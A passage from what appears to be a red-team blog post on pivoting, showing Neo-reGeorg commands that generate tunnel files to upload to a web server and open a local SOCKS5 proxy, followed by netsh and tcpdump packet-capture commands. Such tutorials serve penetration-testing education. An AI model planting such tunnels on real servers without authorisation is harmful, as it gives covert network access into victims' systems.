<h3 id="Basic-Usage-Commands"><a href="#Basic-Usage-Commands" class="headerlink" title="Basic Usage &amp; Commands"></a>Basic Usage &amp; Commands</h3><ol>
<li>Set the password to generate tunnel server and upload it to the web server:</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python neoreg.<span class="property">py</span> generate -k password</span><br><span class="line"></span><br><span class="line">    [+] <span class="title class_">Create</span> neoreg server <span class="attr">files</span>:</span><br><span class="line">       =&gt; neoreg_servers/tunnel.<span class="property">jsp</span></span><br><span class="line">       =&gt; neoreg_servers/tunnel.<span class="property">jspx</span></span><br><span class="line">       =&gt; neoreg_servers/tunnel.<span class="property">ashx</span></span><br><span class="line">       =&gt; neoreg_servers/tunnel.<span class="property">aspx</span></span><br><span class="line">       =&gt; neoreg_servers/tunnel.<span class="property">php</span></span><br><span class="line">       =&gt; neoreg_servers/tunnel.<span class="property">go</span></span><br></pre></td></tr></table></figure>

<ol>
<li>Use <code>neoreg.py</code> to connect to the web server and create a socks5 proxy locally.</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python3 neoreg.<span class="property">py</span> -k password -u <span class="attr">http</span>:<span class="comment">//xx/tunnel.php</span></span><br><span class="line">+------------------------------------------------------------------------+</span><br><span class="line">  <span class="title class_">Log</span> <span class="title class_">Level</span> set to [<span class="variable constant_">DEBUG</span>]</span><br><span class="line">  <span class="title class_">Starting</span> socks server [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span>]</span><br><span class="line">  <span class="title class_">Tunnel</span> <span class="attr">at</span>:</span><br><span class="line">    <span class="attr">http</span>:<span class="comment">//xx/tunnel.php</span></span><br><span class="line">+------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<h2 id="Capture-Network-Traffic-with-builtin-Tools"><a href="#Capture-Network-Traffic-with-builtin-Tools" class="headerlink" title="Capture Network Traffic with builtin Tools"></a>Capture Network Traffic with builtin Tools</h2><h3 id="Windows-netsh"><a href="#Windows-netsh" class="headerlink" title="Windows - netsh"></a>Windows - netsh</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># start a capture use the netsh command.</span><br><span class="line">netsh trace start capture=yes report=disabled tracefile=<span class="attr">c</span>:\trace.<span class="property">etl</span> maxsize=<span class="number">16384</span></span><br><span class="line"></span><br><span class="line"># stop the trace</span><br><span class="line">netsh trace stop</span><br><span class="line"></span><br><span class="line"># <span class="title class_">Event</span> tracing can be also used across a reboots</span><br><span class="line">netsh trace start capture=yes report=disabled persistent=yes tracefile=<span class="attr">c</span>:\trace.<span class="property">etl</span> maxsize=<span class="number">16384</span></span><br><span class="line"></span><br><span class="line"># <span class="title class_">To</span> open the file <span class="keyword">in</span> <span class="title class_">Wireshark</span> you have to convert the etl file to the cap file format. <span class="title class_">Microsoft</span> has written a convert <span class="keyword">for</span> <span class="variable language_">this</span> task. <span class="title class_">Download</span> the latest version.</span><br><span class="line">etl2pcapng.<span class="property">exe</span> <span class="attr">c</span>:\trace.<span class="property">etl</span> <span class="attr">c</span>:\trace.<span class="property">pcapng</span></span><br><span class="line"></span><br><span class="line"># <span class="title class_">Use</span> filters</span><br><span class="line">netsh trace start capture=yes report=disabled <span class="title class_">Ethernet</span>.<span class="property">Type</span>=<span class="title class_">IPv4</span> <span class="title class_">IPv4</span>.<span class="property">Address</span>=<span class="number">10.200</span><span class="number">.200</span><span class="number">.3</span> tracefile=<span class="attr">c</span>:\trace.<span class="property">etl</span> maxsize=<span class="number">16384</span></span><br></pre></td></tr></table></figure>

<h3 id="Linux-tcpdump"><a href="#Linux-tcpdump" class="headerlink" title="Linux - tcpdump"></a>Linux - tcpdump</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install tcpdump</span><br><span class="line">tcpdump -w <span class="number">0001</span>.<span class="property">pcap</span> -i eth0</span><br><span class="line">tcpdump -A -i eth0</span><br><span class="line"></span><br><span class="line"># capture every <span class="variable constant_">TCP</span> packet</span><br><span class="line">tcpdump -i eth0 tcp</span><br><span class="line"></span><br><span class="line"># capture everything on port <span class="number">22</span></span><br><span class="line">tcpdump -i eth0 port <span class="number">22</span></span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="0xd1s">0xd1s</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://ischyr.github.io/2025/09/25/pivoting-tunneling-and-lateral-movement/">http://ischyr.github.io/2025/09/25/pivoting-tunneling-and-lateral-movement/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/windows/">windows</a><a class="post-meta__tags" href="/tags/linux/">linux</a><a class="post-meta__tags" href="/tags/pivoting/">pivoting</a><a class="post-meta__tags" href="/tags/tunneling/">tunneling</a><a class="post-meta__tags" href="/tags/lateral-movement/">lateral movement</a></div><div class="post-share"><div class="social-share" data-image="/2025/09/25/pivoting-tunneling-and-lateral-movement/pivoting-tunneling-and-lateral-movement.png" data-sites="facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/08/01/vulnlab-sync/" title="Vulnlab Sync"><img class="cover" src="/2025/08/01/vulnlab-sync/vulnlab-sync.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Vulnlab Sync</div></div><div class="info-2"><div class="info-item-1">Sync VLNMAP Scanning:1234567891011121314151617181920212223242526272829└─$ nmap -A -sC -sV -p21,22,80,873 10.10.110.93 -Pn                                    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 13:36 ESTNmap scan report for 10.10.110.93Host is up (0.041s latency).PORT    STATE SERVICE VERSION21/tcp  open  ftp     vsftpd 3.0.522/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/06/24/understanding-the-pe/" title="Understanding the PE"><img class="cover" src="/2025/06/24/understanding-the-pe/understanding-the-pe-cover.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-24</div><div class="info-item-2">Understanding the PE</div></div><div class="info-2"><div class="info-item-1">Understanding PEWhat does it mean ?The Portable Executable (PE) format is the standard file format used for executables, object code, dynamic-link libraries (DLLs), and other binary files on both 32-bit and 64-bit versions of Windows, as well as in UEFI environments. It serves as the primary format for executable files on Windows NT-based systems, including file types such as .exe, .dll, .sys (system drivers), and .mui. Essentially, the PE format is a structured data container that provides...</div></div></div></a><a class="pagination-related" href="/2025/06/24/understanding-the-peb/" title="Understanding the PEB"><img class="cover" src="/2025/06/24/understanding-the-peb/understanding-the-peb-cover.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-24</div><div class="info-item-2">Understanding the PEB</div></div><div class="info-2"><div class="info-item-1">Understanding The PEBComing soon… </div></div></div></a><a class="pagination-related" href="/2025/06/24/vulnlab-retro/" title="Vulnlab Retro"><img class="cover" src="/2025/06/24/vulnlab-retro/vulnlab-retro.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-24</div><div class="info-item-2">Vulnlab Retro</div></div><div class="info-2"><div class="info-item-1">Retro VLNMAP Scanning:1234567891011121314151617Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT      STATE SERVICE          REASON53/tcp    open  domain           syn-ack ttl 127135/tcp   open  msrpc            syn-ack ttl 127139/tcp   open  netbios-ssn      syn-ack ttl 127445/tcp   open  microsoft-ds     syn-ack ttl 127464/tcp   open  kpasswd5         syn-ack ttl 127593/tcp   open  http-rpc-epmap   syn-ack ttl 1273268/tcp  open  globalcatLDAP    syn-ack ttl...</div></div></div></a><a class="pagination-related" href="/2025/08/01/vulnlab-feedback/" title="Vulnlab Feedback"><img class="cover" src="/2025/08/01/vulnlab-feedback/vulnlab-feedback.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-01</div><div class="info-item-2">Vulnlab Feedback</div></div><div class="info-2"><div class="info-item-1">Feedback VLNMAP Scanning:123456789101112131415161718192021222324└─$ nmap -A -sC -sV -p22,8080 10.10.127.134 -PnStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 14:44 ESTNmap scan report for 10.10.127.134Host is up (0.039s latency).PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 63:ef:9d:79:12:a0:1a:08:92:8e:0d:b7:4a:7d:b2:7d (RSA)|   256 f8:bf:ad:21:f1:6b:e1:c8:dc:29:78:65:55:69:7e:37 (ECDSA)|_ ...</div></div></div></a><a class="pagination-related" href="/2025/08/01/vulnlab-sync/" title="Vulnlab Sync"><img class="cover" src="/2025/08/01/vulnlab-sync/vulnlab-sync.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-01</div><div class="info-item-2">Vulnlab Sync</div></div><div class="info-2"><div class="info-item-1">Sync VLNMAP Scanning:1234567891011121314151617181920212223242526272829└─$ nmap -A -sC -sV -p21,22,80,873 10.10.110.93 -Pn                                    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 13:36 ESTNmap scan report for 10.10.110.93Host is up (0.041s latency).PORT    STATE SERVICE VERSION21/tcp  open  ftp     vsftpd 3.0.522/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">0xd1s</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ischyr"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://www.linkedin.com/in/iulian-schifirnet-238049201/" target="_blank" title="LinkedIn"><i class="fa-brands fa-linkedin" style="color: #ffffff;"></i></a><a class="social-icon" href="mailto:contact@iscguard.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #ffffff;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Welcome to the Red Teaming world !</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pivoting-Tunneling-and-Lateral-Movement-Techniques"><span class="toc-number">1.</span> <span class="toc-text">Pivoting, Tunneling and Lateral Movement - Techniques</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Local-Port-Forwarding-Remote-Port-Forwarding"><span class="toc-number">1.1.</span> <span class="toc-text">Local Port Forwarding &amp; Remote Port Forwarding</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-Port-Forwarding"><span class="toc-number">1.1.1.</span> <span class="toc-text">Local Port Forwarding</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Remote-Port-Forwarding"><span class="toc-number">1.1.2.</span> <span class="toc-text">Remote Port Forwarding</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Resources"><span class="toc-number">1.2.</span> <span class="toc-text">Resources</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Double-Pivoting-using-SSH-and-ProxyChains4"><span class="toc-number">1.3.</span> <span class="toc-text">Double Pivoting using SSH and ProxyChains4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Layout"><span class="toc-number">1.3.1.</span> <span class="toc-text">The Layout</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Connecting-to-the-first-machine"><span class="toc-number">1.3.2.</span> <span class="toc-text">Connecting to the first machine:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Double-Pivoting-using-Ligolo-NG"><span class="toc-number">1.4.</span> <span class="toc-text">Double Pivoting using Ligolo-NG</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Starting-the-Double-Pivot"><span class="toc-number">1.4.1.</span> <span class="toc-text">Starting the Double Pivot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Performing-File-Transfers-and-Reverse-Shells"><span class="toc-number">1.4.2.</span> <span class="toc-text">Performing File Transfers and Reverse Shells</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Catching-the-Reverse-Shell"><span class="toc-number">1.4.3.</span> <span class="toc-text">Catching the Reverse Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Accessing-Localhost-Ports"><span class="toc-number">1.4.4.</span> <span class="toc-text">Accessing Localhost Ports</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ligolo-Builtin-Commands"><span class="toc-number">1.4.5.</span> <span class="toc-text">Ligolo Builtin Commands</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Chisel"><span class="toc-number">1.5.</span> <span class="toc-text">Chisel</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse-SOCKS-Proxy"><span class="toc-number">1.5.1.</span> <span class="toc-text">Reverse SOCKS Proxy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RevSOCKS"><span class="toc-number">1.6.</span> <span class="toc-text">RevSOCKS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-Build-for-Linux"><span class="toc-number">1.6.1.</span> <span class="toc-text">How to Build for Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Usage-Commands"><span class="toc-number">1.6.2.</span> <span class="toc-text">Usage Commands</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Neo-reGeorg-Web-SOCKS"><span class="toc-number">1.7.</span> <span class="toc-text">Neo-reGeorg - Web SOCKS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Basic-Usage-Commands"><span class="toc-number">1.7.1.</span> <span class="toc-text">Basic Usage &amp; Commands</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Capture-Network-Traffic-with-builtin-Tools"><span class="toc-number">1.8.</span> <span class="toc-text">Capture Network Traffic with builtin Tools</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-netsh"><span class="toc-number">1.8.1.</span> <span class="toc-text">Windows - netsh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-tcpdump"><span class="toc-number">1.8.2.</span> <span class="toc-text">Linux - tcpdump</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/09/25/pivoting-tunneling-and-lateral-movement/" title="Pivoting, Tunneling and Lateral Movement - Techniques"><img src="/2025/09/25/pivoting-tunneling-and-lateral-movement/pivoting-tunneling-and-lateral-movement.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pivoting, Tunneling and Lateral Movement - Techniques"/></a><div class="content"><a class="title" href="/2025/09/25/pivoting-tunneling-and-lateral-movement/" title="Pivoting, Tunneling and Lateral Movement - Techniques">Pivoting, Tunneling and Lateral Movement - Techniques</a><time datetime="2025-09-25T15:07:44.000Z" title="Created 2025-09-25 18:07:44">2025-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/01/vulnlab-feedback/" title="Vulnlab Feedback"><img src="/2025/08/01/vulnlab-feedback/vulnlab-feedback.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnlab Feedback"/></a><div class="content"><a class="title" href="/2025/08/01/vulnlab-feedback/" title="Vulnlab Feedback">Vulnlab Feedback</a><time datetime="2025-08-01T11:00:00.000Z" title="Created 2025-08-01 14:00:00">2025-08-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/01/vulnlab-sync/" title="Vulnlab Sync"><img src="/2025/08/01/vulnlab-sync/vulnlab-sync.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnlab Sync"/></a><div class="content"><a class="title" href="/2025/08/01/vulnlab-sync/" title="Vulnlab Sync">Vulnlab Sync</a><time datetime="2025-08-01T11:00:00.000Z" title="Created 2025-08-01 14:00:00">2025-08-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/24/vulnlab-retro/" title="Vulnlab Retro"><img src="/2025/06/24/vulnlab-retro/vulnlab-retro.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnlab Retro"/></a><div class="content"><a class="title" href="/2025/06/24/vulnlab-retro/" title="Vulnlab Retro">Vulnlab Retro</a><time datetime="2025-06-24T19:00:00.000Z" title="Created 2025-06-24 22:00:00">2025-06-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/24/understanding-the-pe/" title="Understanding the PE"><img src="/2025/06/24/understanding-the-pe/understanding-the-pe-cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Understanding the PE"/></a><div class="content"><a class="title" href="/2025/06/24/understanding-the-pe/" title="Understanding the PE">Understanding the PE</a><time datetime="2025-06-24T16:00:00.000Z" title="Created 2025-06-24 19:00:00">2025-06-24</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2025 By 0xd1s</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>